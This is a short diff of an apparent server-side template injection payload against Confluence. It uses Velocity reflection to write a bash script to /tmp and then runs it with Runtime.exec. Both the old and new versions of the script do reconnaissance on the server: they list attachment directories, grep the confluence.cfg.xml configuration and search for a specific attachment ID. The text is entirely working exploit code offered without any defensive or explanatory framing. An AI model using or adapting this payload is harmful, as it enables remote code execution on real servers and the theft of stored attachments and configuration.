@@ -1,6 +1,6 @@
 #set($x = "")
 #set($w2 = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$w2.write("echo ===S1===; ls -la /u01/confluence-home/attachments/ver003/121/121/31621121/ 2>&1 | head -8; echo ===S2===; ls -la /u01/confluence-home/attachments/ver003/nonspaced/0/ 2>&1 | head -6; echo ===S3===; ls /u01/confluence-home/attachments/ver003/nonspaced/0/0 2>/dev/null | head -4")
+$w2.write("echo ===V===; ls -la /u01/confluence-home/attachments/ver003/121/121/31621121/17/ 2>&1 | head -5; echo ===CFGATT===; grep -i 'attach\|directory' /u01/confluence-home/confluence.cfg.xml 2>&1 | head -12; echo ===FIND6===; timeout 90 find /u01/confluence-home/attachments/ver003 -maxdepth 6 -name '14713529' 2>/dev/null | head -3")
 $w2.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
